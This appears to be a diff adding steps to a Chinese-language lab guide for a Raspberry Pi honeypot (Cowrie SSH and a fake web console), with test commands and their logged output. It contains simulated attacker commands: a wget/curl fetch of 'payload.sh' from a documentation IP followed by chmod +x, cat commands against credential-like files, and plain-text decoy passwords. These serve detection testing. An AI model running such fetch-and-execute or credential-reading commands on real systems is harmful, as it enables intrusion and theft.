@@ -698,18 +698,222 @@ root         28002 0.0        0.0        0         0         ?       Ss    Jul23
 root         4392  0.0        0.1        5416      1024      ?       Ss    Jul22 0:00  /usr/sbin/sshd: backup@pts/0
 backup       4397  0.0        0.1        5416      1024      pts/0   Ss    06:30 0:00  -bash
 backup       4399  0.0        0.1        2435      929       pts/0   Ss    06:30 0:00  ps aux
-
 ```
 
+### Step 11.7：測試 SSH honeyfile 存取
+- 繼續在 Cowrie 假 shell 裡輸入：
+```
+cat /home/admin/secrets.txt
+cat /home/admin/backup_config.ini
+cat /home/admin/database_passwords.txt
+cat /home/backup/backup_jobs.txt
+cat /etc/edge-gateway/app.conf
 
+# 即使檔案在 Cowrie shell 裡顯示不存在，也沒有關係。
+重點是 Cowrie log 會記錄：CMD: cat /home/admin/secrets.txt
 
+#parser 會依照命令字串中的 honeyfile 名稱判斷：SSH_HONEYFILE_ACCESS
 
+# 執行結果：
+lss@lss:/opt/deception-lab $ cat /home/admin/secrets.txtcat /home/admin/secrets.txt
+cat: /home/admin/secrets.txt: No such file or directory
+lss@lss:/opt/deception-lab $ cat /home/admin/backup_config.inicat /home/admin/backup_config.ini
+cat: /home/admin/backup_config.ini: No such file or directory
+lss@lss:/opt/deception-lab $ cat /home/admin/database_passwords.txtcat /home/admin/database_passwords.txt
+cat: /home/admin/database_passwords.txt: No such file or directory
+lss@lss:/opt/deception-lab $ cat /home/backup/backup_jobs.txtcat /home/backup/backup_jobs.txt
+cat: /home/backup/backup_jobs.txt: No such file or directory
+lss@lss:/opt/deception-lab $ cat /etc/edge-gateway/app.confcat /etc/edge-gateway/app.conf
+cat: /etc/edge-gateway/app.conf: No such file or directory
 
+backup@svr04:~$ cat /home/admin/secrets.txt
+cat: /home/admin/secrets.txt: No such file or directory
+backup@svr04:~$ cat /home/admin/backup_config.ini
+cat: /home/admin/backup_config.ini: No such file or directory
+backup@svr04:~$ cat /home/admin/database_passwords.txt
+cat: /home/admin/database_passwords.txt: No such file or directory
+backup@svr04:~$ cat /home/backup/backup_jobs.txt
+cat: /home/backup/backup_jobs.txt: No such file or directory
+backup@svr04:~$ cat /etc/edge-gateway/app.conf
+cat: /etc/edge-gateway/app.conf: No such file or directory
+```
 
+### Step 11.8：測試 SSH 工具下載行為
+- 繼續在 Cowrie 假 shell 裡輸入以下安全測試命令：
+```
+wget http://192.0.2.123/a.sh
+curl http://192.0.2.123/payload.sh -o /tmp/payload.sh
+chmod +x /tmp/payload.sh
 
+# 說明：
+192.0.2.0/24 是文件範例用 IP，不是真實攻擊目標。
+這些命令只是輸入到 Cowrie 假 shell，用來產生 log。
 
+# 這些應該會被 parser 偵測為：SSH_TOOL_TRANSFER_COMMAND
 
+完成後離開 Cowrie：exit
 
+# 執行結果：
+backup@svr04:~$ wget http://192.0.2.123/a.sh
+--2026-05-22 04:06:35--  http://192.0.2.123/a.sh
+Connecting to 192.0.2.123:80... connected.
+HTTP request sent, awaiting response...
+^C
+backup@svr04:~$ cancel failed: Operation timed out.
+backup@svr04:~$ curl http://192.0.2.123/payload.sh -o /tmp/payload.sh
+curl: (7) Failed to connect to 192.0.2.123 port 80: Operation timed out
+backup@svr04:~$ chmod +x /tmp/payload.sh
+chmod: cannot access '/tmp/payload.sh': No such file or directory
+backup@svr04:~$ exit
+Connection to 127.0.0.1 closed.
+lss@lss:/opt/deception-lab $
+```
+
+### Step 11.9：測試 Web 登入失敗
+- 在 Raspberry Pi 上執行：
+```
+curl -s -X POST http://127.0.0.1:8080/login \
+  -d "username=admin" \
+  -d "password=wrongpassword" \
+  -o /tmp/web-login-failed.html
+```
+- 確認有產生登入事件：
+```
+tail -n 5 /opt/deception-lab/data/logs/web/web_auth.jsonl
+
+# 你應該看到："honeycredential_used": false
+
+# 執行結果：
+lss@lss:/opt/deception-lab $ curl -s -X POST http://127.0.0.1:8080/login \
+  -d "username=admin" \
+  -d "password=wrongpassword" \
+  -o /tmp/web-login-failed.html
+lss@lss:/opt/deception-lab $ tail -n 5 /opt/deception-lab/data/logs/web/web_auth.jsonl
+{"timestamp": "2026-05-11T21:46:56.695098+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "192.168.1.1", "username": "admin", "password_sha256": "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92", "password_length": 6, "honeycredential_used": false, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36", "severity": "medium", "tags": ["web", "login"]}
+{"timestamp": "2026-05-11T22:18:07.651474+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "192.168.1.1", "username": "backup", "password_sha256": "0ecba7213823d57d8b9c6510186aa9ba9e401b2f4508e792f8f3ca4aec6394e1", "password_length": 12, "honeycredential_used": false, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36", "severity": "medium", "tags": ["web", "login"]}
+{"timestamp": "2026-05-12T18:36:26.543366+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "backup", "password_sha256": "a597108ff8384b3be204d08bce36fe3e86bffcc699fdac27604db48ae6f27f71", "password_length": 11, "honeycredential_used": true, "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "login", "honeycredential"]}
+{"timestamp": "2026-05-12T18:41:52.679019+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "backup", "password_sha256": "a597108ff8384b3be204d08bce36fe3e86bffcc699fdac27604db48ae6f27f71", "password_length": 11, "honeycredential_used": true, "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "login", "honeycredential"]}
+{"timestamp": "2026-05-21T20:10:34.117443+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "admin", "password_sha256": "8ecd67dceb90a898b1f94bddf570ce1c23629cd328140d81f1e02e43d42eb44e", "password_length": 13, "honeycredential_used": false, "user_agent": "curl/8.14.1", "severity": "medium", "tags": ["web", "login"]}
+```
+
+### Step 11.10：測試 Web honeycredential 使用
+- 執行：
+```
+curl -s -X POST http://127.0.0.1:8080/login \
+  -d "username=backup" \
+  -d "password=Backup2026!" \
+  -o /tmp/web-login-honeycredential.html
+
+# 確認是否回到 dashboard：
+grep -E "Dashboard|Authentication accepted" /tmp/web-login-honeycredential.html
+
+# 查看 auth log：
+tail -n 5 /opt/deception-lab/data/logs/web/web_auth.jsonl
+
+# 你應該看到：
+"honeycredential_used": true
+
+# 這會被 parser 偵測成：
+WEB_HONEYCREDENTIAL_USED
+
+# 執行結果：
+lss@lss:/opt/deception-lab $ curl -s -X POST http://127.0.0.1:8080/login \
+  -d "username=backup" \
+  -d "password=Backup2026!" \
+  -o /tmp/web-login-honeycredential.html
+lss@lss:/opt/deception-lab $ grep -E "Dashboard|Authentication accepted" /tmp/web-login-honeycredential.html
+  <title>Dashboard - Internal Device Management Console</title>
+    <h1>Device Management Dashboard</h1>
+    <div class="warning">Authentication accepted. Some modules are temporarily unavailable.</div>
+lss@lss:/opt/deception-lab $ tail -n 5 /opt/deception-lab/data/logs/web/web_auth.jsonl
+{"timestamp": "2026-05-11T22:18:07.651474+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "192.168.1.1", "username": "backup", "password_sha256": "0ecba7213823d57d8b9c6510186aa9ba9e401b2f4508e792f8f3ca4aec6394e1", "password_length": 12, "honeycredential_used": false, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36", "severity": "medium", "tags": ["web", "login"]}
+{"timestamp": "2026-05-12T18:36:26.543366+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "backup", "password_sha256": "a597108ff8384b3be204d08bce36fe3e86bffcc699fdac27604db48ae6f27f71", "password_length": 11, "honeycredential_used": true, "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "login", "honeycredential"]}
+{"timestamp": "2026-05-12T18:41:52.679019+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "backup", "password_sha256": "a597108ff8384b3be204d08bce36fe3e86bffcc699fdac27604db48ae6f27f71", "password_length": 11, "honeycredential_used": true, "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "login", "honeycredential"]}
+{"timestamp": "2026-05-21T20:10:34.117443+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "admin", "password_sha256": "8ecd67dceb90a898b1f94bddf570ce1c23629cd328140d81f1e02e43d42eb44e", "password_length": 13, "honeycredential_used": false, "user_agent": "curl/8.14.1", "severity": "medium", "tags": ["web", "login"]}
+{"timestamp": "2026-05-21T20:13:55.354969+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "backup", "password_sha256": "a597108ff8384b3be204d08bce36fe3e86bffcc699fdac27604db48ae6f27f71", "password_length": 11, "honeycredential_used": true, "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "login", "honeycredential"]}
+```
+- 確認Step 11.10：測試 Web honeycredential 使用結果
+```
+確認：Step 11.10 測試 Web honeycredential 使用成功。
+你這次測試用了：
+username=backup
+password=Backup2026!
+結果分成兩個部分確認。
+# 1. Web 頁面回應成功
+grep -E "Dashboard|Authentication accepted" /tmp/web-login-honeycredential.html
+--------------
+lss@lss:/opt/deception-lab $ grep -E "Dashboard|Authentication accepted" /tmp/web-login-honeycredential.html
+  <title>Dashboard - Internal Device Management Console</title>
+    <h1>Device Management Dashboard</h1>
+    <div class="warning">Authentication accepted. Some modules are temporarily unavailable.</div>
+看到：<HTML>
+這代表 Fake Web 已經接受這組 honeycredential，並回傳 Dashboard 頁面。
+所以：
+backup / Backup2026!
+已成功觸發 fake admin login。
+
+# 2. Web auth log 成功記錄 honeycredential
+你的最後一筆 log 是：JSON
+"username": "backup",
+"honeycredential_used": true,
+"severity": "high",
+"tags": ["web", "login", "honeycredential"]
+這代表系統已正確判定：
+backup / Backup2026! 是 honeycredential
+而且事件嚴重度也正確標成：high
+```
+
+### Step 11.11：測試 Web honeyfile 下載
+- 執行：
+```
+curl -s http://127.0.0.1:8080/download/secrets.txt -o /tmp/secrets.txt
+curl -s http://127.0.0.1:8080/download/backup_config.ini -o /tmp/backup_config.ini
+curl -s http://127.0.0.1:8080/download/database_passwords.txt -o /tmp/database_passwords.txt
+```
+- 查看下載內容：
+```
+head -n 10 /tmp/secrets.txt
+head -n 10 /tmp/backup_config.ini
+head -n 10 /tmp/database_passwords.txt
+
+# 執行結果：
+lss@lss:/opt/deception-lab $ curl -s http://127.0.0.1:8080/download/secrets.txt -o /tmp/secrets.txt
+lss@lss:/opt/deception-lab $ curl -s http://127.0.0.1:8080/download/backup_config.ini -o /tmp/backup_config.ini
+lss@lss:/opt/deception-lab $ curl -s http://127.0.0.1:8080/download/database_passwords.txt -o /tmp/database_passwords.txt
+lss@lss:/opt/deception-lab $ head -n 10 /tmp/secrets.txt
+Internal Secret Notes
+
+Do not distribute.
+
+Temporary accounts:
+admin / Admin@12345
+backup / Backup2026!
+operator / P@ssw0rd!
+
+Legacy VPN account:
+lss@lss:/opt/deception-lab $ head -n 10 /tmp/backup_config.ini
+[backup-server]
+host=192.0.2.20
+username=backup
+password=Backup2026!
+schedule=02:00
+
+[database]
+host=192.0.2.30
+username=dbadmin
+password=ChangeMe_2026!
+lss@lss:/opt/deception-lab $ head -n 10 /tmp/database_passwords.txt
+Database Credential Backup
+
+db-main:
+host=192.0.2.30
+username=dbadmin
+password=ChangeMe_2026!
+
+db-report:
+host=192.0.2.31
+username=report
+```
 
 
 
